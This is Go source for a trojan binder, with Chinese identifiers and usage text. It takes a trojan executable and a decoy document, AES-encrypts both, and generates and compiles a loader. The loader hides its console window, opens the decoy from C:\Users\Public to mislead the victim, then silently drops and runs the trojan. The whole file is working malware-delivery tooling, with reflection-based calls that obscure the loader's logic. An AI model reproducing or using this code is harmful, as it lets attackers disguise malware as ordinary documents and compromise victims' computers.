package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

var (
	logo = `
	\__  |   |   |  |__   _____|__|_  _  __ ____ |__|
	/   |   |   |  |  \ /  ___/  \ \/ \/ // __ \|  |
	\____   |   |   Y  \\___ \|  |\     /\  ___/|  |
	/ ______|___|___|  /____  >__| \/\_/  \___  >__|
	\/               \/     \/                \/   
	`
	tvb = "这是我的频道欢迎投稿学习:https://space.bilibili.com/353948151	"

	tishi = `
	命令参数如: main.exe	ma.exe xxx.doc 
			  main.exe	ma.exe xxx.doc ico.syso
	`
)

func RandStr(length int) string {
	str := "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	bytes := []byte(str)
	result := []byte{}
	rand.Seed(time.Now().UnixNano() + int64(rand.Intn(100)))
	for i := 0; i < length; i++ {
		result = append(result, bytes[rand.Intn(len(bytes))])
	}
	return string(result)
}
func main() {
	fmt.Println(logo)
	fmt.Println(tvb)

	if len(os.Args) != 3 && len(os.Args) != 4{
		fmt.Println(tishi)
		return
	}
	mumafile := os.Args[1]
	docfile := os.Args[2]
	key := RandStr(16)

	info, _ := ioutil.ReadFile(mumafile)
	var mumafileStr string = string(info[:])
	AesmumafileStr := AesEncrypt(mumafileStr, key)

	infodoc, _ := ioutil.ReadFile(docfile)
	var docfileStr string = string(infodoc[:])
	AesdocfileStr := AesEncrypt(docfileStr, key)
	SourceCode := fmt.Sprintf(`package main
import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"os"
	"os/exec"
	"reflect"
	"strings"
	"syscall"
	"github.com/lxn/win"
)

var (
	jian          = "%s"
	mumawenjianname = "%s"
	docwenjianname  = "%s"
	docwenjiannames = "%s"
	docwenjian = "%s"

	numawenjian = "%s"
	dstdawenjian    = "ffff.DAT"
	selwenjian, _ = os.Executable()
	ddocwenjian = str_func(aesjiami,docwenjian, jian)[0].String()

	dmumawenjian = str_func(aesjiami,numawenjian, jian)[0].String()
)

func main() {
	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
	a,_ := os.Getwd()
	b := os.Args[0]
	c := strings.Replace(b,a,"",-1)
	dstdawenjian = c

	panfu := selwenjian[0:2]
	if !strings.Contains(selwenjian, "C:") {

		dstdawenjian = panfu + "\\ffff.DAT"
	} else {
		dstdawenjian = panfu + dstdawenjian
	}

	//os.Rename(selwenjian, dstdawenjian)


	f2, _ := os.Create("C:\\Users\\Public\\" + docwenjianname)
	_, _ = f2.Write([]byte(ddocwenjian))
	f2.Close()


	cmd := exec.Command("cmd",  " /c ","C:\\Users\\Public\\"+docwenjiannames)

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	//cmd2.Stdout = os.Stdout
	_ = cmd.Start()
	var dstFilecc = "C:\\Users\\Public\\" + mumawenjianname
	f, _ := os.Create(dstFilecc)
	_, _ = f.Write([]byte(dmumawenjian))
	f.Close()


	_, err := os.Stat(dstFilecc)

	if err == nil {

		cmda := exec.Command(dstFilecc)
		_ = cmda.Start()

	}


}

func Pdaing(org []byte) []byte {
	length := len(org)
	unpadding := int(org[length-1])
	return org[:(length - unpadding)]
}
func aesjiami(can1 string, key string) string {
	kuashuzu, _ := base64.StdEncoding.DecodeString(can1)
	k := []byte(key)
	blo, _ := aes.NewCipher(k)
	blodaxiao := blo.BlockSize()
	blomoshi := cipher.NewCBCDecrypter(blo, k[:blodaxiao])
	org := make([]byte, len(kuashuzu))
	blomoshi.CryptBlocks(org, kuashuzu)
	org = str_func(Pdaing,org)[0].Bytes()
	return string(org)
}

func str_func(hanshu interface{}, canshu ...interface{}) []reflect.Value {
	//将函数包装为反射值对象
	funcValue := reflect.ValueOf(hanshu)
	//构造函数参数
	paramList := []reflect.Value{}
	for i := 0; i < len(canshu); i++ {
		paramList = append(paramList, reflect.ValueOf(canshu[i]))
	}
	//调用函数
	jieguo := funcValue.Call(paramList)
	//返回结果
	return jieguo
}
	`, key, mumafile, docfile, docfile, AesdocfileStr, AesmumafileStr)

	lujing := ""
	comm := "go build main.go"
	lujing2 := ""
	if len(os.Args) == 4 {
		os.Mkdir("./dabao", os.ModePerm)
		lujing = "./dabao/"
		lj, _ := os.Getwd()
		lujing2 = lj+"\\dabao\\"
		comm =  "cd "+ lujing2 + " && go build"
		if strings.HasSuffix(os.Args[3],".syso") {
			nr,err := ioutil.ReadFile(os.Args[3])
			if err != nil {
				return
			}
			f, _ := os.Create(lujing + "tubiao.syso")
			_, _ = f.Write(nr)
			f.Close()
			exitfile(lujing + "tubiao.syso")
			time.Sleep(time.Duration(1) * time.Second)
		}else {
			return
		}
	}

	f, _ := os.Create(lujing + "main.go")
	_, _ = f.Write([]byte(SourceCode))
	f.Close()
	exitfile(lujing +"main.go")
	time.Sleep(time.Duration(1) * time.Second)

	batfile, _ := os.Create(lujing +"Yihsiwei.bat")

	_, _ = batfile.Write([]byte(comm))
	batfile.Close()
	exitfile(lujing +"Yihsiwei.bat")
	time.Sleep(time.Duration(1) * time.Second)
	cmd := exec.Command(lujing2 +"Yihsiwei.bat")
	cmd.Start()

	exitfile(lujing +"dabao.exe")
	os.RemoveAll(lujing +"main.go")
	os.RemoveAll(lujing +"Yihsiwei.bat")
	os.RemoveAll(lujing +"tubiao.syso")

}
func exitfile(filename string) {
	for {
		fmt.Println(filename)
		time.Sleep(time.Duration(1) * time.Second)
		_, err := os.Stat(GetCurrentDirectory() + "/" + filename)
		//fmt.Println(err)
		if err == nil {
			break
		}
	}
}
func GetCurrentDirectory() string {
	dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
	if err != nil {
		log.Fatal(err)
	}

	return strings.Replace(dir, "\\", "/", -1)
}
func PKCS7Padding(ciphertext []byte, blocksize int) []byte {
	padding := blocksize - len(ciphertext)%blocksize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func AesEncrypt(orig string, key string) string {
	origData := []byte(orig)
	k := []byte(key)
	block, _ := aes.NewCipher(k)
	blockSize := block.BlockSize()
	origData = PKCS7Padding(origData, blockSize)
	blockMode := cipher.NewCBCEncrypter(block, k[:blockSize])
	cryted := make([]byte, len(origData))
	blockMode.CryptBlocks(cryted, origData)
	return base64.StdEncoding.EncodeToString(cryted)
}


